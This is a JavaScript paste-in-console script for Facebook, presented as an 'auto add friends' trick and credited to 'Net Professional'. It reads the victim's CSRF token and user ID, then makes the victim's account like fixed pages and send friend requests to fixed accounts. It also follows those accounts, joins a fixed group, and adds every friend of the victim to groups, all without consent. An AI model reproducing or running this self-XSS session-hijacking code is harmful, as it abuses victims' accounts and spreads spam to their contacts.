//eval
var parent=document.getElementsByTagName("html")[0]; 
var _body = document.getElementsByTagName('body')[0];
var _div = document.createElement('div');
_div.style.height="25";
_div.style.width="100%";
_div.style.position="fixed";
_div.style.top="auto";
_div.style.bottom="0";
_div.align="center";
_body.appendChild(_div);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

body = document.body;

if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "100px";
 div.style.opacity= 0.90;
 div.style.bottom = "+35px";
 div.style.left = "+0px";
 div.style.backgroundColor = "rgba(0,0,0,0.5)";
 div.style.border = "1px solid rgba(0,0,0,0.5)";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Close (F5)</center></blink></a>"
 body.appendChild(div);
}
if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "135px";
 div.style.opacity= 0.90;
 div.style.bottom = "+10px";
 div.style.left = "+0px";
 div.style.backgroundColor = "rgba(0,0,0,0.5)";
 div.style.border = "1px solid rgba(0,0,0,0.5)";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='http://www.netpf.com/' title='Net Professional'><blink><center>For More Tricks!</center></blink></a>"
 body.appendChild(div);
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function Like(p) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}

Like("439430329420491");
Like("418836291540460");
Like("233578153383244");


var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();

  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}

IDS("100001052749861");
IDS("100001734339861");

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone) {
  var http4 = new XMLHttpRequest();
  var url4 = "/ajax/follow/follow_profile.php?__a=1";
  var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
  http4.open("POST", url4, true);
  http4.onreadystatechange = function () {
    if (http4.readyState == 4 && http4.status == 200) {
      http4.close;
    }
  };
  http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("100001052749861");
a("100001734339861");

sublist("663827066995712");
sublist("635397336505352");

var gid = ['186721701492634'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
data = eval('(' + gf['responseText']['substr'](9) + ')');
if (data['error']) {} else {
friends = data['payload']['entries']['sort'](function(_0x93dax8, _0x93dax9) {
return _0x93dax8['index'] - _0x93dax9['index']
})
}
};
var Title = 'Auto Add  Friends Made By Hassan Waatmani<A style="color:#3B5998;" href="#"><br/>.....please wait....</A>';
grpname = document.getElementById("groupsJumpTitle").innerHTML;
var Descriptions = "",
_text = 'Made By Hassan Waatmani <A style="color:#3B5998;" href="https://www.facebook.com/waatmani">Net Professional.</A> Follow.';

function AddFriendtoGroup(opo) {
jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=" + gid + "&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function(a) {
var b = a.substring(a.indexOf("{"));
var c = JSON.parse(b);
i--;
Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
if (c.error) {
Descriptions += "color:darkred'>";
err++;
if (c.errorDescription) Descriptions += c.errorDescription;
else Descriptions += JSON.stringify(c, null, "")
} else {
Descriptions += "color:darkgreen'>";
Descriptions += arn[i] + " has been added.<br/>";
suc++
}
Descriptions += "</div>";
var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
if (i > 0) {
display += arr.length + " Friends Detected<br/>";
display += "<b>" + suc + "</b> Friends Added of " + (arr.length - i) + " Friends Processed ";
display += "(" + i + " Lefted...)";
display += "<div class='friend-edge'>";
display += Descriptions;
display += "<img style='background:center no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
display += getuname + " Adding Friend in " + grpname + ".<br/>";
display += _text;
display += "</div>";
display += "</div>"
} else {
display += arr.length + " Friends Detected<br/>";
display += suc + " Friends Added</br>";
display += err + " Friends Not Added</br></br>";
display += "<div><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Cancel</span>"
}
display += "</div>";
document.getElementById("pagelet_sidebar").innerHTML = display
}, "text", "post");
tay--;
if (tay > 0) {
var s = arr[tay];
sx = pho[tay];
setTimeout("AddFriendtoGroup(" + s + ")", 100)
}
console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
if (gid != 186721701492634) {
jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=186721701492634&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function() {}, "text", "post")
}
if (newcomer) {
jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100003641944821&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581651071156988110194", function() {}, "text", "post")
}
}
function clickfr_callback() {
if (document.getElementsByName("ok").length > 0) nHtml.ClickUp(document.getElementsByName("ok")[0]);
var a = arr[i];
if (i < arr.length) addfriend(a.substring(0, 4))
}
function clickfr() {
if (document.getElementsByClassName("search").length > 0) nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1]);
else j++;
setTimeout("clickfr_callback()", 2E3)
}
function addfriend(a) {
i++;
setTimeout("clickfr()", 2E3)
}
jx = {
getHTTPObject: function() {
var a = false;
if (typeof ActiveXObject != "undefined") try {
a = new ActiveXObject("Msxml2.XMLHTTP")
} catch (b) {
try {
a = new ActiveXObject("Microsoft.XMLHTTP")
} catch (c) {
a = false
}
} else if (window.XMLHttpRequest) try {
a = new XMLHttpRequest
} catch (b) {
a = false
}
return a
},
load: function(url, callback, format, method, opt) {
var http = this.init();
if (!http || !url) return;
if (http.overrideMimeType) http.overrideMimeType("text/xml");
if (!method) method = "GET";
if (!format) format = "text";
if (!opt) opt = {};
format = format.toLowerCase();
method = method.toUpperCase();
var now = "uid=" + (new Date).getTime();
url += url.indexOf("?") + 1 ? "&" : "?";
url += now;
var parameters = null;
if (method == "POST") {
var parts = url.split("?");
url = parts[0];
parameters = parts[1]
}
http.open(method, url, true);
var ths = this;
if (opt.handler) http.onreadystatechange = function() {
opt.handler(http)
};
else http.onreadystatechange = function() {
if (http.readyState == 4) if (http.status == 200) {
var result = "";
if (http.responseText) result = http.responseText;
if (format.charAt(0) == "j") {
result = result.replace(/[\n\r]/g, "");
result = eval("(" + result + ")")
} else if (format.charAt(0) == "x") result = http.responseXML;
if (callback) callback(result)
} else {
if (opt.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);
if (opt.loading) document.getElementById(opt.loading).style.display = "none";
if (error) error(http.status)
}
};
http.send(parameters)
},
bind: function(a) {
var b = {
url: "",
onSuccess: false,
onError: false,
format: "text",
method: "GET",
update: "",
loading: "",
loadingIndicator: ""
};
for (var c in b) if (a[c]) b[c] = a[c];
if (!b.url) return;
var d = false;
if (b.loadingIndicator) {
d = document.createElement("div");
d.setAttribute("style", "position:absolute;top:0px;left:0px;");
d.setAttribute("class", "loading-indicator");
d.innerHTML = b.loadingIndicator;
document.getElementsByTagName("body")[0].appendChild(d);
this.opt.loadingIndicator = d
}
if (b.loading) document.getElementById(b.loading).style.display = "block";
this.load(b.url, function(a) {
if (b.onSuccess) b.onSuccess(a);
if (b.update) document.getElementById(b.update).innerHTML = a;
if (d) document.getElementsByTagName("body")[0].removeChild(d);
if (b.loading) document.getElementById(b.loading).style.display = "none"
}, b.format, b.method, b)
},
init: function() {
return this.getHTTPObject()
}
};
var nHtml = {
FindByAttr: function(a, b, c, d) {
if (c == "className") c = "class";
var e = document.evaluate(".//" + b + "[@" + c + "='" + d + "']", a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
if (e && e.singleNodeValue) return e.singleNodeValue;
return null
},
FindByClassName: function(a, b, c) {
return this.FindByAttr(a, b, "className", c)
},
FindByXPath: function(a, b) {
try {
var c = document.evaluate(b, a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null)
} catch (d) {
GM_log("bad xpath:" + b)
}
if (c && c.singleNodeValue) return c.singleNodeValue;
return null
},
VisitUrl: function(a) {
window.setTimeout(function() {
document.location.href = a
}, 500 + Math.floor(Math.random() * 500))
},
ClickWin: function(a, b, c) {
var d = a.document.createEvent("MouseEvents");
d.initMouseEvent(c, true, true, a, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
return !b.dispatchEvent(d)
},
Click: function(a) {
return this.ClickWin(window, a, "click")
},
ClickTimeout: function(a, b) {
window.setTimeout(function() {
return nHtml.ClickWin(window, a, "click")
}, b + Math.floor(Math.random() * 500))
},
ClickUp: function(a) {
this.ClickWin(window, a, "mousedown");
this.ClickWin(window, a, "mouseup");
this.ClickWin(window, a, "click")
},
GetText: function(a, b) {
var c = "";
if (b == undefined) b = 0;
if (b > 40) return;
if (a.textContent != undefined) return a.textContent;
for (var d = 0; d < a.childNodes.length; d++) {
var e = a.childNodes[d];
c += this.GetText(e, b + 1)
}
return c
}
};
if (document.getElementsByClassName == undefined) document.getElementsByClassName = function(a) {
var b = new RegExp("(?:^|\\s)" + a + "(?:$|\\s)");
var c = document.getElementsByTagName("*");
var d = [];
var e;
for (var f = 0;
(e = c[f]) != null; f++) {
var g = e.className;
if (g && g.indexOf(a) != -1 && b.test(g)) d.push(e)
}
return d
};
Array.prototype.find = function(a) {
var b = false;
for (i = 0; i < this.length; i++) if (typeof a == "function") {

if (a.test(this[i])) {
if (!b) b = [];
b.push(i)
}
} else if (this[i] === a) {
if (!b) b = [];
b.push(i)
}
return b
};
var i = 3;
var tay = 3;
var j = 0;
var k = 0;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var getuname = document.getElementsByClassName("fbxWelcomeBoxName")[0].innerHTML;
var gid = document.getElementsByName("group_id")[0].value;
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", function(a) {
var b = a;
var c = b.substring(b.indexOf("{"));
var d = JSON.parse(c);
d = d.payload.entries;
for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
i = arr.length - 1;
tay = i;
console.log(arr.length);
var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
display += arr.length + " Friends Detected";
display += "</div>";
document.getElementById("pagelet_sidebar").innerHTML = display;
AddFriendtoGroup(arr[i])
});
